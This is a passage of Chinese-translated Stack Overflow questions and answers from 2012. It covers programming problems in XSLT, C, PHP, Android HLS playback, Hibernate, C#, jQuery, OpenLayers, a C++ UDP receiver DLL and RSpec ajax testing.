<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html" encoding="utf-8" indent="yes"/>

<xsl:variable name="accounts">
    <xsl:for-each select="data/ACCOUNTS">
        <child elem="{@elem}"><xsl:value-of select="ACCOUNT_NO" /></child>
    </xsl:for-each>
</xsl:variable>

<xsl:template match="/">
    <html>
        <head><title>testing</title></head>
        <body>
            <xsl:value-of select="$accounts/child[@elem='0']" />
        </body>
    </html>
</xsl:template>
</xsl:stylesheet> 
```

**当我编译我得到这个错误：**

```
JAXPSAXProcessorInvoker  - Error checking type of the expression 'FilterParentPath(variable-ref(accounts/result-tree), step("child", 40, pred(=(step("attribute", 18), literal-expr(0)))))'. 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:50:32.757

如果我的理解是正确的，

## 输入 XML：

```
<data>
    <ACCOUNTS elem="0">
        <ACCOUNT_NO>12345</ACCOUNT_NO>
    </ACCOUNTS>
    <ACCOUNTS elem="1">
        <ACCOUNT_NO>67890</ACCOUNT_NO>
    </ACCOUNTS>
</data> 
```

## XSLT：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:output method="html"/>
    <xsl:template match="/">
        <xsl:for-each select="data/ACCOUNTS">
            <child elem="{@elem}">
                <xsl:value-of select="ACCOUNT_NO"/>
            </child>
        </xsl:for-each>
    </xsl:template>
</xsl:stylesheet> 
```

## 输出 HTML：

```
<child elem="0">12345</child>
<child elem="1">67890</child> 
```

## 另一个 XSLT：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:output method="html"/>
    <xsl:template match="/">
        <xsl:variable name="accounts">
            <xsl:for-each select="data/ACCOUNTS">
                <child elem="{@elem}">
                    <xsl:value-of select="ACCOUNT_NO"/>
                </child>
            </xsl:for-each>
        </xsl:variable>
        <xsl:value-of select="$accounts/child[@elem='1']"/>
    </xsl:template>
</xsl:stylesheet> 
```

## 输出：

```
67890 
```

# 更新：

@Kelvingo：根据您更新的 XSLT，我觉得您可能需要**msxsl:node-set**才能使用它

```
<xsl:value-of select="msxsl:node-set($accounts)/child[@elem='0']"/> 
```

账户变量。

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt">
    <xsl:output method="html" encoding="utf-8" indent="yes"/>
    <xsl:variable name="accounts">
        <xsl:for-each select="data/ACCOUNTS">
            <child elem="{@elem}">
                <xsl:value-of select="ACCOUNT_NO"/>
            </child>
        </xsl:for-each>
    </xsl:variable>
    <xsl:template match="/">
        <html>
            <head>
                <title>testing</title>
            </head>
            <body>
                <xsl:value-of select="msxsl:node-set($accounts)/child[@elem='0']"/>
            </body>
        </html>
    </xsl:template>
</xsl:stylesheet> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T09:13:17.153

对于您的特定 XSLT 引擎，如果输出方法是 HTML，那么必须有一个输出根元素。

我的解决方案（未经测试）是对 Siva 的调整。我刚刚确保了单根元素输出。

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:output method="html"/>
    <xsl:template match="/">
       <html> 
        <xsl:for-each select="data/ACCOUNTS">
            <child elem="{@elem}">
                <xsl:value-of select="ACCOUNT_NO"/>
            </child>
        </xsl:for-each>
      </html>
    </xsl:template>
</xsl:stylesheet> 
```

# actionscript-3 - 嵌入时加载的 xml 元素

> ID：10811900
> 
> 赞同：0
> 
> 时间：2012-05-30T07:35:16.530
> 
> 标签：actionscript-3, flash

这可能是一个愚蠢的问题，但由于某种原因，在我的 swf 应用程序中，应该从 xml 加载的图像在嵌入时不是，但是当从它的 url 访问 .swf 时，它工作正常。

换句话说，当我访问

localhost/project/swf/myswf.swf < 加载 xml 很好

但如果它像嵌入

```
<embed src="/project/swf/myswf.swf"></embed> 
```

这会加载 swf，但没有图像从其中的 xml 加载。

起初我认为这与在 actionscript 中加载的 url 有关。swf 文件夹的文件结构如下：

```
/swf
/elements
 - images
 - images
 - images, etc.
elements.xml
myswf.swf 
```

因此 swf 在读取 xml 中的 url 后从 elements 文件夹加载图像。

我将 xml url 的 AS 更改为仅将“elements.xml”更改为完整的 url，但没有帮助，可能导致问题的原因是什么？

# linux - gcc中的“初始化元素不是常量”错误

> ID：10811905
> 
> 赞同：2
> 
> 时间：2012-05-30T07:35:51.910
> 
> 标签：linux, gcc, initializer

我尝试使用 make 文件编译 C 代码。我收到以下错误：

```
/home/dev5/src/ermparselex.c:69: error: initializer element is not constant
/home/dev5/src/ermparselex.c:69: error: (near initialization for âyyinâ) 
```

代码片段以及行号：

```
65 int yyleng; extern char yytext[];
 66 int yymorfg;
 67 extern char *yysptr, yysbuf[];
 68 int yytchar;
 69 FILE *yyin = stdin, *yyout = stdout;
 70 extern int yylineno;
 71 struct yysvf {
 72         struct yywork *yystoff;
 73         struct yysvf *yyother;
 74         int *yystops;};
 75 struct yysvf *yyestate;
 76 extern struct yysvf yysvec[], *yybgin; 
```

`stdin`和的值`stdout`未在此代码中的任何位置定义。我无法从谷歌获得适当的解决方案。知道为什么会发生此错误吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-30T09:00:52.817

在 C 中，全局变量只能用常量表达式或字符串字面量进行初始化，并且常量表达式的规则比 C++ 中严格得多。

`stdin`并且`stdout`是指向全局对象的指针，它们不是常量（地址可能直到链接时才知道），因此您不能使用它们来初始化全局变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T08:03:41.303

确保包含 stdio.h，并删除大括号：

```
#include <stdio.h>

FILE *yyin = stdin, *yyout = stdout; 
```

包含定义标准输入/标准输出。

大括号 '{}' 改变了编译器如何解释 'stdin' 和 'stdout' 的值，不要那样做。

# php - 在多维数组中查找值

> ID：10811908
> 
> 赞同：0
> 
> 时间：2012-05-30T07:35:57.353
> 
> 标签：php

我有一个多维数组：

```
array (
    array (
        "username"        => "foo",
        "favoriteGame"    => "Mario"
    )
    array (
        "username"        => "bar",
        "favoriteGame"    => "Mario"
    )
    array (
        "username"        => "xyz",
        "favoriteGame"    => "Zelda"
    )
) 
```

我怎样才能以最简单的方式获得喜欢玩的人的用户名，例如马里奥？

**编辑：** 我的错：忘记明确提及“favoriteGame”值是动态的，我无法提前知道它是哪个。

**我的解决方案：**

```
foreach($users as $key => $value)
{
    if(!isset($$value['favoriteGame']))
    {
        $$value['favoriteGame'] = array();
    }
    array_push($$value['favoriteGame'], $value['username']);
} 
```

遍历每个子数组并找到它的 favoriteGame 值。如果还没有数组 $favoriteGame 创建它。将实际子数组的用户名值推送到 $favoriteGame 数组。

感谢您的回复，我只是无法正确表达这个问题。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-30T07:38:03.263

```
function getUsernamesByFavoriteGame($data, $game) {
    $usernames = array();
    foreach($data as $arr) {
        if ($arr['favoriteGame'] == $game) {
            $usernames[] = $arr['username'];
        }
    }
    return $usernames;
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-30T07:38:31.623

```
 $usernames = array();
 foreach($array as $key => $value) {
     if ($value['favoriteGame'] == 'Mario') {
         $usernames[] = $value['username'];
     }
 } 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-30T07:45:07.583

我会用`array_filter`. 如果你有 PHP 5.3 或更高版本，你可以这样做：

```
$favorite = "Mario";
$filter = function($player) use($favorite) { return $player['favoriteGame'] == $favorite; };
$filtered = array_filter($players, $filter); 
```

旧版本会有所不同，因为您将无法使用 lambda 函数。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-30T07:44:01.963

```
 $game = 'Mario';   
 $users = array();
 foreach($array as $key => $value) {
     if ($value['favoriteGame'] == $game) {
         $users[] = $value['username'];
     }
 } 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-05-30T07:44:08.697

如果您更频繁地使用它，则将数据结构转换为类似的东西。

```
 array(
   "Mario" => array(
               "0":"foo",
               "1":"xyz"
               )
   "Zelda" => array(
               "0":"pqr",
               "1":"abc"
              )
 ) 
```

这将直接为您提供最喜欢的游戏的用户名列表。

```
$arr[$favGame] 
```

如果您无法更改数据结构，那么建议使用 tigrang。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-05-30T08:02:06.483

我认为您应该实现自定义多维搜索功能。
看看[这个答案](https://stackoverflow.com/a/1019126/944301)。

* * *

这是您将如何使用它的方法

代码 | [活生生的例子](http://codepad.viper-7.com/VqjxHC)

```
function search($array, $key, $value){
    $results = array();

    if (is_array($array))
    {
        if (isset($array[$key]) && $array[$key] == $value)
            $results[] = $array;

        foreach ($array as $subarray)
            $results = array_merge($results, search($subarray, $key, $value));
    }

    return $results;
}

$arr = array (
    array (
        "username"        => "foo",
        "favoriteGame"    => "Mario"
    ),
    array (
        "username"        => "bar",
        "favoriteGame"    => "Mario"
    ),
    array (
        "username"        => "xyz",
        "favoriteGame"    => "Zelda"
    )
);

print_r(search($arr, 'favoriteGame', 'Mario'));

//OUTPUT
Array ( 
    [0] => Array ( 
        [username] => foo 
        [favoriteGame] => Mario 
    ) 
    [1] => Array ( 
        [username] => bar 
        [favoriteGame] => Mario 
    ) 
) 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-07-12T14:04:43.543

```
$array = array( 'a' => 'A',
    'b'=>'B',
    'c'=>'C',
    'd'=>array(
        'e'=>array(
           'f'=>'D'
        ),
        'g'=>array(
            'h'=>'E'
        )
    ),
    'i'=>'F',
    'j'=>array(
        'k'=>'G'
    ),
    'l'=>'H'
);

$new_array = array();
foreach($array as $k1=>$v1){
    if(is_array($v1)){
        $new_array = parseArray($new_array, $k1, $v1);
    }else{
        $new_array = array_merge($new_array, array($k1=>$v1));
    }
}

function parseArray($new_array, $key, $val){
    if(is_array($val)){
        foreach($val as $k2=>$v2){
            if(is_array($v2)){
               $new_array = parseArray($new_array, $k2, $v2);
            }else{
               $new_array = array_merge($new_array, array($k2=>$v2));
            }
        }
    }else{
        $new_array = array_merge($new_array, array($key=>$val));
    }
    return $new_array;
} 
```

**输出**

```
Array
(
    [a] => A
    [b] => B
    [c] => C
    [f] => D
    [h] => E
    [i] => F
    [k] => G
    [l] => H
) 
```

# php - 大量使用会影响会话吗？

> ID：10811914
> 
> 赞同：0
> 
> 时间：2012-05-30T07:36:16.077
> 
> 标签：php, session

我有一个用 PHP/MySQL 开发的学校网站。我的一位经理抱怨说系统会在一段时间后自动将他注销。该经理的工作时间是**网站使用高峰期**。

我的问题是，如果很多人同时登录，这会导致会话超时/自动注销或类似的事情吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T17:25:04.323

这是因为垃圾收集器的默认会话超时时间为 1440 秒。

您可以提高超时时间，或者每 10 分钟放弃一次 AJAX 调用，以重置超时时间……这就是所谓的“会话拉伸”。

# android - 由于 seekTo() 导致 m3u8 声音丢失

> ID：10811916
> 
> 赞同：0
> 
> 时间：2012-05-30T07:36:27.553
> 
> 标签：android, audio, streaming

*我有一个播放.mp4*的应用程序的源代码，我必须让它与 HLS 一起使用。

播放了视频和声音，但我只有 .m3u8 有 2 个问题：

1）当*seekTo()*被激活（评论被删除）时，声音被禁用，当我想退出播放器时，它需要很长时间才能完成，并且会使应用程序崩溃。

2) setLooping 不起作用并返回**Error (-38,0)**，尝试执行错误的 seekTo

`state: mPlayer=0x1e0380, mCurrentState=0`

注意：这些问题仅适用于 .M3U8

播放器代码如下：

```
private void playVideo() {
    doCleanUp();
    try {
        // Create a new media player and set the listeners

        mMediaPlayer = new MediaPlayer();
        mMediaPlayer.setDataSource(mFilePath);
        mMediaPlayer.setDisplay(mSurfaceHolder);       
        mMediaPlayer.prepare(); 
        mMediaPlayer.start();
        mMediaPlayer.setOnCompletionListener(this);
        mMediaPlayer.setOnVideoSizeChangedListener(this);
        mMediaPlayer.setOnPreparedListener(this);
        //mMediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC); 
        //mMediaPlayer.seekTo(mResumePosition);
        //mMediaPlayer.setLooping(true);

    } catch (Exception e) {
        Log.e(LOG_TAG, "error: " + e.getMessage(), e);
        showErrorMessage(mErrorPlayingVideo);
        // Toast.makeText(this, "Impossible de jouer la vidÃ©o",
        // 5000).show();
    }
} 
```

在 setDataSource() 下激活 setLooping 时的日志：

```
error (-38, 0)
prepareAsync called in wrong state 0
prepareAsync_l return error =-38
error: null
java.lang.IllegalStateException
at android.media.MediaPlayer.prepare(Native Method)
at fr.niji.broadpeak.activity.BroadpeakDemoPlayer.playVideo(BroadpeakDemoPlayer.java:409)
at fr.niji.broadpeak.activity.BroadpeakDemoPlayer.onRequestFinished(BroadpeakDemoPlayer.java:585)
at fr.niji.lib.dataproxy.service.DataManager.handleResult(DataManager.java:262)
at fr.niji.lib.dataproxy.service.DataManager.onRequestFinished(DataManager.java:292)
at fr.niji.lib.dataproxy.service.ServiceHelper.handleResult(ServiceHelper.java:297)
at fr.niji.lib.dataproxy.service.ServiceHelper$EvalReceiver.onReceiveResult(ServiceHelper.java:119)
at android.os.ResultReceiver$MyRunnable.run(ResultReceiver.java:43)
at android.os.Handler.handleCallback(Handler.java:587)
at android.os.Handler.dispatchMessage(Handler.java:92)
at android.os.Looper.loop(Looper.java:132)
at android.app.ActivityThread.main(ActivityThread.java:4126)
at java.lang.reflect.Method.invokeNative(Native Method)
at java.lang.reflect.Method.invoke(Method.java:491)
at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:844)
at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:602)
at dalvik.system.NativeStart.main(Native Method) 
```

并在代码下方：

```
Attempt to perform seekTo in wrong state: mPlayer=0x1e0380, 
mCurrentState=0
error (-38, 0)
Error (-38,0)
Error (-38,0)
Attempt to perform seekTo in wrong state: mPlayer=0x1e0380, mCurrentState=0
Error (-38,0)
Error (-38,0)
Attempt to perform seekTo in wrong state: mPlayer=0x1e0380, mCurrentState=0 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-31T08:13:28.643

好的，我发现了问题。当您将 seekTo() 与 .m3u8 文件一起使用并且括号之间的值设置为 0 时，它不起作用，因此我在 playBackVideo() 方法中添加了一个条件：

`if (mResumePosition > 0) mMediaPlayer.seekTo(mResumePosition);`

所以 mResumePosition 永远不会被设置为 0 并在文件的开头播放。另外，我解决了 setLooping() 问题，在

`public void onCompletion(final MediaPlayer mediaPlayer)`

我添加了`mMediaPlayer.release(); playVideo();`

并且循环效果很好！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T09:56:49.087

您需要检查它是否是 LIVE 案例。如果是，则循环和搜索可能不可用。

# hibernate - Hibernate：重用休眠类

> ID：10811925
> 
> 赞同：0
> 
> 时间：2012-05-30T07:36:52.220
> 
> 标签：hibernate, inheritance

我在数据库中有 2 个包含确切列的表。

我可以知道是否可以有一个抽象类并将其扩展为 2 表。

示例抽象表

表一个扩展表。表 b 扩展表。

我已经阅读了继承，但它似乎不符合我的需要 [http://openjpa.apache.org/builds/1.0.4/apache-openjpa-1.0.4/docs/manual/jpa_overview_mapping_inher.html#jpa_overview_mapping_inher_single](http://openjpa.apache.org/builds/1.0.4/apache-openjpa-1.0.4/docs/manual/jpa_overview_mapping_inher.html#jpa_overview_mapping_inher_single)

我看不到如何指定表名。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T07:53:22.057

这对我有用：

```
public abstract class Table {

    private String commonField;

    @Column(name = "COMMON_FIELD")
    public String getCommonField() {
        return commonField;
    }

    public void setCommonField(String commonField) {
        this.commonField = commonField;
    }

}

@Entity
@Table(name = "table_a")
public class TableA extends Table {

    // table_a fields only

}

@Entity
@Table(name = "table_b")
public class TableB extends Table {

    // table_b fields only

} 
```

# c# - C#：是否可以有部分扩展类

> ID：10811928
> 
> 赞同：1
> 
> 时间：2012-05-30T07:37:05.000
> 
> 标签：c#

我正在寻找将不同程序集中的实体框架实体扩展到 EF 实体的扩展类。我还想在扩展方法类中编写一些附加/通用方法（使用 T4），然后能够使用其他自定义方法创建部分扩展方法类。这可能吗。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T07:44:13.043

你不需要它们。只需编写另一个扩展类。

```
namespace Namespace1
{
    public static class MyEntityBlibblingExtensions
    {
        public void Blibble(this MyEntity self)
        {
            // ...
        }
    }
} 
```

然后，在别处...

```
namespace Namespace2
{
    public static class MyEntityFurtlingExtensions
    {
        public void Furtle(this MyEntity self)
        {
            // ...
        }
    }
} 
```

任何导入`Namespace1`都会看到扩展方法`Blibble()`，而任何导入`Namespace2`都会看到`Furtle()`，并且同时导入两者都会看到。它们可以在不同的程序集中或任何 import`MyEntity`的命名空间中。因此，部分扩展并不是一个真正有效的概念。事实上，将扩展方法放在类中的想法本身就是一种 hack —— 遗憾的是，他们无法充分利用 C# 的规则，让扩展方法存在于类之外。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-30T07:40:11.163

是的 - 我试过了，它奏效了。

没有“扩展”类之类的东西——只有扩展方法必须在“静态”类中。

您可以拥有静态部分类。

更新：对不起，我读了你的标题，但没有读到你的问题的文字。答案仍然是肯定的，但为什么不直接创建新类呢？在这种情况下，我看不出有一个部分类真的有什么帮助。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-30T07:41:55.860

我在这里看到的主要问题是“在不同的程序集中”这个短语。`partial class`如果不是这样，您可以使用常规*实例*方法添加您的方法等，一切都会好起来的。

您*可以*拥有静态分部类，但不能使用分部类添加到另一个程序集中的类型。扩展方法在部分类中可以正常工作，但请注意，部分类纯粹是一种在不同文件之间拆分代码的机制。您可以轻松地为扩展方法拥有多个静态类。

# jquery - 如何通过窗口获取文档对象？

> ID：10811931
> 
> 赞同：0
> 
> 时间：2012-05-30T07:37:07.077
> 
> 标签：jquery

场景是窗口作为参数传递给函数，我还需要使用窗口的文档来搜索函数中的元素。不知道如何通过 $(winObjParamter) 获取文档对象。winObjParamter 是传递给函数的参数。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T07:40:53.713

[`document`是 的一个属性`window`](https://developer.mozilla.org/en/DOM/window.document)，因此您可以像访问任何其他属性一样访问它：

```
var doc = winObjParamter.document; 
```

与上述链接的 MDN 文章指出`document`：

> 返回对包含在窗口中的文档的引用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:41:19.817

只是`winObjParamter.document`用来获取`document`窗口的对象。

参考：[https ://developer.mozilla.org/en/DOM/window](https://developer.mozilla.org/en/DOM/window)

# firebug - 在 Openlayers 中更改多边形的顶点会产生多个错误

> ID：10811933
> 
> 赞同：0
> 
> 时间：2012-05-30T07:37:10.237
> 
> 标签：firebug, openlayers, polygon, vertices

```
updatePolygon: function() {
    drawControls.modify.createVertices;
    var sides = 50;
    drawControls.regular.handler.sides = sides;
} 
```

我从 OpenLayers 示例中得到了这个函数。它完全有效，只有萤火虫会在要编辑的点悬停时给出多个错误：

```
this.features["OpenLayers.Feature.Vector_" + (id - 1 + this.hitOverflow)] is undefined
http://freetrack.local/js/OpenLayers.js
Line 1310 
```

有人可以帮我解决这个问题，因为它看起来不太整洁。

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-31T14:17:30.513

@Pepijn，我面临一个接近这个挑战的挑战，不得不从多边形中更改一个点，以下代码有效，希望对您有所帮助。

```
var ls = new OpenLayers.Geometry.LineString([a, b]);

    // calculate scale
    var distance = a.distanceTo(b);
    var scale = newSize / distance;

    ls.resize(scale, a);
    var newB = ls.getVertices()[1];
    console.debug( 'novo b : ' + newB );

    var ownerFeature = vectors.getFeatureById(owner)
    var points = ownerFeature.geometry.getVertices();

    for (var i=0;i<points.length-1;i++){
        if( points[i].x == b.x && points[i].y == b.y ){
            console.debug('found b');
            ownerFeature.geometry.addComponent(newB,i);
            ownerFeature.geometry.removeComponent(b);
            vectors.redraw();
            break;      
        }
    } 
```

# c# - 我有一个 C# 程序的 C++ DLL 变量

> ID：10811941
> 
> 赞同：1
> 
> 时间：2012-05-30T07:37:27.917
> 
> 标签：c#, c++

我已经创建了一个在 C# 平台上使用的 C++ DLL，我真的不知道如何在文本框中打印 C# 中的“printf”消息，有人可以指导我如何做到这一点吗？

这是DLL文件的代码：

```
#include "stdafx.h"
#define HAVE_REMOTE
#define MAX_BUF_SIZE 1024
#define snprintf _snprintf
#define ETH_ALEN 6
#define IP_ALEN 4
#define ARP_REQUEST 1
#define ARP_REPLY 2
#define DllExport   __declspec( dllexport )

#include <stdlib.h>
#include <stdio.h>
#include <winsock2.h>
#include <pcap.h>
#include <iostream>

#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "Ws2_32.lib")

// A sample of the select() return value
DllExport int recvfromTimeOutUDP(SOCKET socket, long sec, long usec)
{
    // Setup timeval variable
    struct timeval timeout;
    struct fd_set fds;

    timeout.tv_sec = sec;
    timeout.tv_usec = usec;
    // Setup fd_set structure
    FD_ZERO(&fds);
    FD_SET(socket, &fds);
    // Return value:
    // -1: error occurred
    // 0: timed out
    // > 0: data ready to be read
    return select(0, &fds, 0, 0, &timeout);
}

extern "C" DllExport int ReceiverInformation(char* message, int length)
{
     WSADATA            wsaData;
     SOCKET             ReceivingSocket;
     SOCKADDR_IN        ReceiverAddr;
     int                Port = 5150;
     char           ReceiveBuf[6000];
     int                BufLength = 6000;
     SOCKADDR_IN        SenderAddr;
     int                SenderAddrSize = sizeof(SenderAddr);
     int                ByteReceived = 5, SelectTiming, ErrorCode;
     char ch = 'Y';
     std::string output;

   // Initialize Winsock version 2.2
   if( WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
   {
        output = "Server: WSAStartup failed with error " + WSAGetLastError();
        output += "\n";
   }
   else   
       output += "Server: The Winsock DLL status is "; 
       output += wsaData.szSystemStatus;
       output +="\n";

     // Create a new socket to receive datagrams on.
     ReceivingSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

     if (ReceivingSocket == INVALID_SOCKET)
     {
          output += "Server: Error at socket(): " + WSAGetLastError();
          output += "\n";
          // Clean up
          WSACleanup();
          // Exit with error
          return -1;
     }
     else
          output += "Server: socket() is OK!\n";

     // Set up a SOCKADDR_IN structure that will tell bind that we
     // want to receive datagrams from all interfaces using port 5150.

     // The IPv4 family
     ReceiverAddr.sin_family = AF_INET;
     // Port no. 5150
     ReceiverAddr.sin_port = htons(Port);
     // From all interface (0.0.0.0)
     ReceiverAddr.sin_addr.s_addr = htonl(INADDR_ANY);

   // Associate the address information with the socket using bind.
   // At this point you can receive datagrams on your bound socket.
   if (bind(ReceivingSocket, (SOCKADDR *)&ReceiverAddr, sizeof(ReceiverAddr)) == SOCKET_ERROR)
   {
        output += "Server: bind() failed! Error: "+ WSAGetLastError();
        output += "\n";
        // Close the socket
        closesocket(ReceivingSocket);
        // Do the clean up
        WSACleanup();
        // and exit with error
        return -1;
     }
     else
          output += "Server: bind() is OK!\n";

   // Some info on the receiver side...
   getsockname(ReceivingSocket, (SOCKADDR *)&ReceiverAddr, (int *)sizeof(ReceiverAddr));

   output += "Server: Receiving IP(s) used: "; 
   output += inet_ntoa(ReceiverAddr.sin_addr);
   output += "\n";
   output += "Server: Receiving port used: %d\n" + htons(ReceiverAddr.sin_port);
   output += "Server: I\'m ready to receive a datagram...\n";

   SelectTiming = recvfromTimeOutUDP(ReceivingSocket, 100, 0);

   switch (SelectTiming)
        {
             case 0:
                 // Timed out, do whatever you want to handle this situation
                 output += "Server: Timeout while waiting for client!...\n";
                 break;
             case -1:
                 // Error occurred, maybe we should display an error message?
                // Need more tweaking here and the recvfromTimeOutUDP()...
                 output += "Server: Some error encountered with code number: %ld\n" + WSAGetLastError();
                 break;
             default:
                 {
                      while (1)

                      {
                           // Call recvfrom() to get it then display the received data...
                           ByteReceived = recvfrom(ReceivingSocket, ReceiveBuf, BufLength,
                                                    0, (SOCKADDR *)&SenderAddr, &SenderAddrSize);
                           if ( ByteReceived > 0 )
                           {
                               output += "\n\nServer: Total Bytes received: " + ByteReceived;
                               output += "\n";
                               output += "Server: The data is "; 
                               output += ReceiveBuf;
                               output += "\n";
                           }
                           else if ( ByteReceived <= 0 ){
                                output += "Server: Connection closed with error code: " + WSAGetLastError();
                                output += "\n";
                           }
                           else
                                output += "Server: recvfrom() failed with error code: " + WSAGetLastError();

                           // Some info on the sender side
                           getpeername(ReceivingSocket, (SOCKADDR *)&SenderAddr, &SenderAddrSize);
                           output += "Server: Sending IP used: ";
                           output += inet_ntoa(SenderAddr.sin_addr);
                           output += "\n";
                           output += "Server: Sending port used: "+ htons(SenderAddr.sin_port);
                           output += "\n";
                      }
                 }
   }

   // When your application is finished receiving datagrams close the socket.
   output += "Server: Finished receiving. Closing the listening socket...\n";
   if (closesocket(ReceivingSocket) != 0){
        output += "Server: closesocket() failed! Error code: " + WSAGetLastError();
        output += "\n";
   }
   else
        output += "Server: closesocket() is OK...\n";

   // When your application is finished call WSACleanup.
   output += "Server: Cleaning up...\n";
   if(WSACleanup() != 0){
        output += "Server: WSACleanup() failed! Error code: " + WSAGetLastError();
        output += "\n";
   }
   else
        output += "Server: WSACleanup() is OK\n";
   output.c_str();
   // Back to the system
   // system("PAUSE");
   return 0;
} 
```

这是调用此 DLL 文件的程序的代码：

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace GUI_ServerReceiver
{
    public partial class Form1 : Form
    {
        [DllImport(@"C:\Users\Documents\Server_Receiver Solution DLL\Debug\Server_Receiver.dll", EntryPoint = "DllMain")]
        private static extern int ReceiverInformation(StringBuilder sb, int capacity);

        public Form1()
        {
            InitializeComponent();
            var sb = new StringBuilder(1024);
            ReceiverInformation(sb, sb.Capacity);
            textBox1.Text = sb.ToString();

        }

        private void button1_Click(object sender, EventArgs e)
        {
            //Closes this application
            this.Close();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

    } 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T08:22:16.070

将您的 c++ dll 绑定到您的 c# 项目，（您将调用的函数应该是“externed”）调用您在 dll 中编写的 print 函数，该函数返回一个 char* 或 std::string 例如，然后分配将它添加到先前创建的文本框的“文本”属性中。

# ajax - RSpec控制器ajax请求测试

> ID：10811951
> 
> 赞同：1
> 
> 时间：2012-05-30T07:38:02.597
> 
> 标签：ajax, ruby-on-rails-3, rspec2

我正在测试我的控制器，但请求是通过 ajax 来的。我不知道如何解决这个问题。我正在尝试类似 HTTP 请求的方式，但我在 HTTP 请求之前使用 XHR。但是，当我运行测试时，我看到了这个问题，

```
1) RwsController Update widget score takes widget rate information
     Failure/Error: mock_widget.should_receive(:update_attributes).with({'these' => 'params'})
       (Mock "Widget_1003").update_attributes({"these"=>"params"})
           expected: 1 time
           received: 0 times
     # ./spec/controllers/rws_controller_spec.rb:28:in `block (3 levels) in <top (required)>' 
```

我有一个控制器，所有 ajax 请求都在这里记录数据库，

```
class RwsController < ApplicationController
  layout 'widget'
  skip_before_filter :verify_authenticity_token, :only => [:edit, :update, :show, :getUserInfo]
  respond_to :js, :json, :html

  #cookie check and show exact view
  def show
    @widget = Widget.find_by_uuid(params[:uuid])
    if cookies["last_widget_id"] == @widget.uuid
      render :action => "generate"
    end
    @widget = Widget.find_by_uuid(params[:uuid])
  end

  def edit
    @widget = Widget.find_by_uuid(params[:uuid])
  end

  #after rating the rates and other details record on DB
  def update
    @widget = Widget.find_by_uuid(params[:uuid])
    #logger.info("score-in:  " + params[:score])
    @widget.score = params[:score].to_i
    @widget.total_score = params[:total_score].to_i
    @widget.click_number = params[:click_number].to_i
    @widget.average = params[:average].to_i
    #set cookie
    cookies[:last_widget_id] = {:value => @widget.uuid, :expires => 1.year.from_now}
    @widget.save!
    render :text => 'ok'
    logger.info("score-out:  " + @widget.score.to_s)
    logger.info("cookie-id:  " +  cookies[:last_widget_id])
  end

  #iframe creates and calls .js.erb file
  def generate
    @widget = Widget.find_by_uuid(params[:uuid])
    #@widget_id = @widget.id
    respond_to do |format|
      format.js {}
    end
  end

  #recording the visitor who visit the page
  def getUserInfo
    data = params[:mainURL]
    data1 = params[:mainBrowserAgent]
    data2 = params[:mainReferer]
    data3 = params[:mainDisplayInfo]
    data4 = params[:currentWidgetId]
    @widgetTraffic = WidgetTraffic.new(params[:widget_traffic])
    @widgetTraffic.widget_id = @widget_id
    @widgetTraffic.main_url = data
    @widgetTraffic.main_browser = data1
    @widgetTraffic.main_referer = data2
    @widgetTraffic.main_display = data3
    @widgetTraffic.widget_id = data4

    @widgetTraffic.save!
    render :text => 'ok'
  end
end 
```

所有场景都是用户访问侧面并单击包含分数等信息的链接，然后 ajax 将数据发送到控制器以将其保存，如您在控制器中看到的那样。

但我不能解决吗？我怎样才能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-31T07:36:50.700

您的更新方法在不使用 update_attributes 的情况下更新 @widget 对象：

```
 def update
    @widget = Widget.find_by_uuid(params[:uuid])
    #logger.info("score-in:  " + params[:score])
    @widget.score = params[:score].to_i
    @widget.total_score = params[:total_score].to_i
    @widget.click_number = params[:click_number].to_i
    @widget.average = params[:average].to_i
    #set cookie
    cookies[:last_widget_id] = {:value => @widget.uuid, :expires => 1.year.from_now}
    @widget.save! 
```

但是，您的更新测试预计您将调用 @widget.update_attributes(params)

```
1) RwsController Update widget score takes widget rate information
     Failure/Error: mock_widget.should_receive(:update_attributes).with({'these' => 'params'})
       (Mock "Widget_1003").update_attributes({"these"=>"params"})
           expected: 1 time
